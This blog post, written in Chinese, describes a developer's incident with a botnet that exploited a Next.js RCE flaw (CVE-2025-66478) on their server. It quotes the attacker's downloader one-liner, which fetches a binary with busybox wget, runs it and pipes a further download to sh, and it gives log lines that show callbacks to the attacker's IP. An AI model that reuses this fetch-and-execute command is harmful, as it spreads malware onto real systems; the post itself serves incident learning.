@@ -1,0 +1,55 @@
+<!DOCTYPE html><html lang="zh-Hant"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>殭屍網路真實遭遇分享 | React 安全性漏洞 | CVSS 10/10 | ChiChieh Huang</title><meta name="description" content="沒想過有一天會遇到網路攻擊事件，特別記錄下來給大家參考，也做了幾張投影片讓各位快速了解。 如果你還沒更新 Next.js，記得趕緊更新；如果你是資安專家，也希望能給我一些建議 🙏…"><link rel="canonical" href="https://chichieh-huang.com/posts/%E6%AE%AD%E5%B1%8D%E7%B6%B2%E8%B7%AF%E7%9C%9F%E5%AF%A6%E9%81%AD%E9%81%87%E5%88%86%E4%BA%AB/"><link rel="icon" href="/favicon.svg" type="image/svg+xml"><link rel="alternate" type="application/rss+xml" title="ChiChieh Huang" href="/rss.xml"><meta property="og:title" content="殭屍網路真實遭遇分享 | React 安全性漏洞 | CVSS 10/10 | ChiChieh Huang"><meta property="og:description" content="沒想過有一天會遇到網路攻擊事件，特別記錄下來給大家參考，也做了幾張投影片讓各位快速了解。 如果你還沒更新 Next.js，記得趕緊更新；如果你是資安專家，也希望能給我一些建議 🙏…"><meta property="og:type" content="article"><meta property="og:url" content="https://chichieh-huang.com/posts/%E6%AE%AD%E5%B1%8D%E7%B6%B2%E8%B7%AF%E7%9C%9F%E5%AF%A6%E9%81%AD%E9%81%87%E5%88%86%E4%BA%AB/"><meta property="og:image" content="https://chichieh-huang.com/assets/img/avatar.png"><meta name="twitter:card" content="summary"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#FAF9F6"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1B1A18"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@400;500;700&family=Noto+Serif+TC:wght@600;700&display=swap"><script>
+      const saved = localStorage.getItem('theme');
+      if (saved === 'dark' || saved === 'light') document.documentElement.dataset.theme = saved;
+    </script><link rel="stylesheet" href="/_astro/about.B696kpbe.css">
+<style>.layout[data-astro-cid-egg7nqdx]{display:grid;grid-template-columns:minmax(0,720px);justify-content:center}@media(min-width:1100px){.wrap{max-width:1080px}.layout[data-astro-cid-egg7nqdx]{grid-template-columns:minmax(0,720px) 220px;gap:3.5rem}.toc[data-astro-cid-egg7nqdx]{display:none}}@media(max-width:1099.9px){.toc-rail[data-astro-cid-egg7nqdx]{display:none}}.byline[data-astro-cid-egg7nqdx]{color:var(--ink-2);font-size:.85rem;margin:0 0 2rem}.byline[data-astro-cid-egg7nqdx] a[data-astro-cid-egg7nqdx]{color:var(--ink-2);text-decoration:underline;text-underline-offset:3px}.byline[data-astro-cid-egg7nqdx] a[data-astro-cid-egg7nqdx]:hover{color:var(--accent)}.toc[data-astro-cid-egg7nqdx]{border:1px solid var(--line);border-radius:10px;padding:.6rem 1.1rem;font-size:.9rem;margin:0 0 2rem}.toc[data-astro-cid-egg7nqdx] summary[data-astro-cid-egg7nqdx]{cursor:pointer;color:var(--ink-2)}.toc[data-astro-cid-egg7nqdx] ul[data-astro-cid-egg7nqdx]{list-style:none;padding:.3rem 0 .2rem;margin:0}.toc[data-astro-cid-egg7nqdx] li[data-astro-cid-egg7nqdx]{margin:.25rem 0}.toc[data-astro-cid-egg7nqdx] li[data-astro-cid-egg7nqdx].d3{padding-left:1.25rem}.toc[data-astro-cid-egg7nqdx] a[data-astro-cid-egg7nqdx]{color:var(--ink)}.toc[data-astro-cid-egg7nqdx] a[data-astro-cid-egg7nqdx]:hover{color:var(--accent)}.toc-rail[data-astro-cid-egg7nqdx] nav[data-astro-cid-egg7nqdx]{position:sticky;top:2.5rem;max-height:calc(100vh - 5rem);overflow-y:auto;font-size:.82rem;line-height:1.65}.rail-label[data-astro-cid-egg7nqdx]{font-size:.72rem;letter-spacing:.15em;color:var(--ink-2);margin:0 0 .6rem}.toc-rail[data-astro-cid-egg7nqdx] ul[data-astro-cid-egg7nqdx]{list-style:none;margin:0;padding:0;border-left:1px solid var(--line)}.toc-rail[data-astro-cid-egg7nqdx] li[data-astro-cid-egg7nqdx].d3 a[data-astro-cid-egg7nqdx]{padding-left:1.9rem}.toc-rail[data-astro-cid-egg7nqdx] a[data-astro-cid-egg7nqdx]{display:block;color:var(--ink-2);padding:.22rem 0 .22rem .9rem;border-left:2px solid transparent;margin-left:-1.5px}.toc-rail[data-astro-cid-egg7nqdx] a[data-astro-cid-egg7nqdx]:hover{color:var(--ink);text-decoration:none}.toc-rail[data-astro-cid-egg7nqdx] a[data-astro-cid-egg7nqdx].active{color:var(--accent);border-left-color:var(--accent)}.tags[data-astro-cid-egg7nqdx]{color:var(--ink-2);font-size:.85rem;display:flex;flex-wrap:wrap;gap:.9rem;margin-top:2.5rem}.pager[data-astro-cid-egg7nqdx]{display:flex;justify-content:space-between;gap:1.5rem;margin-top:3rem;padding-top:1.5rem;border-top:1px solid var(--line);font-size:.9rem}.pager[data-astro-cid-egg7nqdx] a[data-astro-cid-egg7nqdx]{color:var(--ink-2);max-width:46%}.pager[data-astro-cid-egg7nqdx] a[data-astro-cid-egg7nqdx]:hover{color:var(--accent)}.pager[data-astro-cid-egg7nqdx] .next[data-astro-cid-egg7nqdx]{text-align:right}
+</style></head> <body> <header data-astro-cid-3ef6ksr2> <div class="wrap bar" data-astro-cid-3ef6ksr2> <a class="logo" href="/" data-astro-cid-3ef6ksr2>ChiChieh Huang</a> <nav aria-label="主選單" data-astro-cid-3ef6ksr2> <a href="/posts/" class="active" data-astro-cid-3ef6ksr2>文章</a><a href="/projects/" data-astro-cid-3ef6ksr2>專案</a><a href="/experience/" data-astro-cid-3ef6ksr2>經歷</a><a href="/about/" data-astro-cid-3ef6ksr2>關於</a> <button id="theme-toggle" aria-label="切換深淺色" title="切換深淺色" data-astro-cid-3ef6ksr2> <svg class="sun" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" data-astro-cid-3ef6ksr2><circle cx="12" cy="12" r="4" data-astro-cid-3ef6ksr2></circle><path d="M12 2v2m0 16v2M4.9 4.9l1.4 1.4m11.4 11.4 1.4 1.4M2 12h2m16 0h2M4.9 19.1l1.4-1.4m11.4-11.4 1.4-1.4" data-astro-cid-3ef6ksr2></path></svg> <svg class="moon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" data-astro-cid-3ef6ksr2><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z" data-astro-cid-3ef6ksr2></path></svg> </button> </nav> </div> </header>  <script type="module">const n=document.getElementById("theme-toggle");n?.addEventListener("click",()=>{const e=document.documentElement,c=window.matchMedia("(prefers-color-scheme: dark)").matches,t=(e.dataset.theme??(c?"dark":"light"))==="dark"?"light":"dark";e.dataset.theme=t,localStorage.setItem("theme",t)});</script> <main class="wrap">  <div class="layout" data-astro-cid-egg7nqdx> <article class="prose" data-astro-cid-egg7nqdx> <h1 data-astro-cid-egg7nqdx>殭屍網路真實遭遇分享 | React 安全性漏洞 | CVSS 10/10</h1> <p class="byline" data-astro-cid-egg7nqdx> 2025/12/09 ·
+<a href="/posts/category/技術/" data-astro-cid-egg7nqdx>技術</a> ·
+        閱讀約 3 分鐘
+ </p>  <p>沒想過有一天會遇到網路攻擊事件，特別記錄下來給大家參考，也做了幾張投影片讓各位快速了解。
+如果你還沒更新 Next.js，記得趕緊更新；如果你是資安專家，也希望能給我一些建議 🙏</p>
+<p>1️⃣ 起初有人提醒我網站無法連線
+昨天網站一直出現 504 無法連線，我以為是老問題，結果 journalctl 打開後發現完全不對，我直接看到一串非常詭異的指令：</p>
+<p>‘(cd /dev;busybox wget <a href="https://lnkd.in/gDNJFzwQ">https://lnkd.in/gDNJFzwQ</a> 777 x86;./x86 reactOnMynuts;busybox wget -q <a href="https://lnkd.in/gi43PY4V">https://lnkd.in/gi43PY4V</a> -O-|sh)’</p>
+<p>那瞬間我心裡一涼，糟糕可能是被惡意入侵了</p>
+<p>2️⃣ 重啟沒用，惡意行為會自動復活
+我先把服務 restart 一次，結果網站沒幾分鐘就會 hang 住， log 出現以下：</p>
+<ul>
+<li>Dec 06 06:27:10 bun[749218]: ⨯ SyntaxError: Cannot use the keyword ‘function’ as a parameter name.</li>
+<li>Dec 06 06:27:10 bun[749218]:  at Function (null)</li>
+<li>Dec 06 06:27:10 bun[749218]:  at processTicksAndRejections (null) { digest: ‘1206194814’ }</li>
+<li>Dec 06 06:31:03 bun[749218]: Connecting to 193.34.213.150 (193.34.213.150:80)</li>
+</ul>
+<p>代表這些東西是從我的 Web service process 裡跑出來的，很像是某段 payload 被塞進 new Function(…) / eval 之類的東西。</p>
+<p>更可怕的是每隔幾秒就嘗試連回 193.34.213.150，重啟只是在幫 malware 重開機而已 🫠</p>
+<p>3️⃣ 把整台機器的證據打包下來
+意識到這台 EC2 已經不乾淨了… 我打算穢土轉生到新的 EC2 上，在走之前我決定先把證據帶走。</p>
+<p>我把所有 log 打包帶走並開始用 grep 在 journal-all.log 裡分析，看攻擊是從什麼時候發生的：</p>
+<ul>
+<li>Dec 06 03:47:51 第一次看到 wget 惡意連線</li>
+<li>Dec 06 14:45:58 我把對方 IP 先 DROP</li>
+</ul>
+<p>也算了一下次數：
+grep -R “wget” journal-all.log | wc -l  # 2714
+grep -R “193.34.213” journal-all.log | wc -l # 2720
+grep -R “nuts” journal-all.log | wc -l  # 2712
+grep -R “bolts” journal-all.log | wc -l # 2712</p>
+<p>也就是說，攻擊是從台灣時間 12/06 03:47 至 12/06 14:45 持續至少 約 11 小時，中間約 2712 次執行 downloader，以 log 顯示平均 每 15 秒就會跑一次左右。</p>
+<p>這代表這次攻擊不是一瞬間，是長時間活躍我的 Bun process 裡面的殭屍 🧟</p>
+<p>4️⃣ 找出原因，入口是 Web Server RCE
+我所有 EC2 都只開 AWS SSM，22 port 長期關閉也沒有暴露 DB 等，但 log 一直顯示是在 bun process 裡被執行，所以猜測是 Web 入口被打。</p>
+<p>我首先查看 code 有沒有 RCE 漏洞，但沒有看到明顯的原因，上網翻了一下才看到 3 天前有公布資安事件：</p>
+<p>CVE-2025-66478 — Next.js React Flight Protocol RCE（Critical 10/10）</p>
+<p>這個漏洞可能允許攻擊者透過 HTTP Request 打進 server-side，直接執行指令，我看到的 log 現象與公開 exploit pattern 非常相似，因此我立刻更新 Next.js 版本防範。</p>
+<p>5️⃣總結
+這次事件讓我意識只要產品上線，安全性就不是選項，而是是基本運營成本，我們花了很多時間在效能、最佳化、部屬流程，但真正讓 EC2 直接癱掉的，不是程式寫不好，而是框架級的漏洞沒跟上。</p>
+<p>我們之後會開始做以下幾件事：</p>
+<ul>
+<li>定期看 React/ Next 的 security advisory</li>
+<li>CVE 公布後 48 小時內強制 patch</li>
+</ul>
+<p>這是第一次遇到，但我相信不會是最後一次🫠</p>
+<p>如果你現在在 production 上跑的是 React / Next / Bun / Node 類的 Web server，最近幾天真的建議回頭看一下 journalctl，搞不好你也會看到一些「你沒有寫過，但看起來很認真在工作的那行指令🙂」</p>
+<p>另外想問大家，有沒有推薦自動監控 CVE 的方式呀?</p>
+<p>hashtag#cybersecurity hashtag#infosec hashtag#devsecops hashtag#cve hashtag#rce hashtag#reactjs
+hashtag#nextjs hashtag#CVE202566478</p>  <nav class="pager" aria-label="前後文章" data-astro-cid-egg7nqdx> <a href="/posts/ai-的可觀測性正在變成標配/" data-astro-cid-egg7nqdx>← AI 的可觀測性正在變成標配</a> <a class="next" href="/posts/state-of-agent-engineering-2025-by-langchain/" data-astro-cid-egg7nqdx>State of Agent Engineering 2025 by LangChain →</a> </nav> </article>  </div>  </main> <footer data-astro-cid-sz7xmlte> <div class="wrap bar" data-astro-cid-sz7xmlte> <span data-astro-cid-sz7xmlte>© 2026 ChiChieh Huang · 由文字與一隻龍蝦驅動 🦞</span> <span class="links" data-astro-cid-sz7xmlte> <a href="https://github.com/wsxqaza12" data-astro-cid-sz7xmlte>GitHub</a> <a href="https://www.linkedin.com/in/chichieh-huang-5322881ba/" data-astro-cid-sz7xmlte>LinkedIn</a> <a href="/rss.xml" data-astro-cid-sz7xmlte>RSS</a> </span> </div> </footer>  </body></html>  <script type="module">const l=document.querySelectorAll("[data-toc-link]");if(l.length>0){const i=[...l].map(t=>document.getElementById(t.dataset.tocLink)).filter(t=>t!==null);let n=!1;const o=()=>{n=!1;let t=null;for(const e of i)if(e.getBoundingClientRect().top<=130)t=e.id;else break;for(const e of l)e.classList.toggle("active",e.dataset.tocLink===(t??i[0]?.id))};document.addEventListener("scroll",()=>{n||(n=!0,requestAnimationFrame(o))},{passive:!0}),o()}</script>
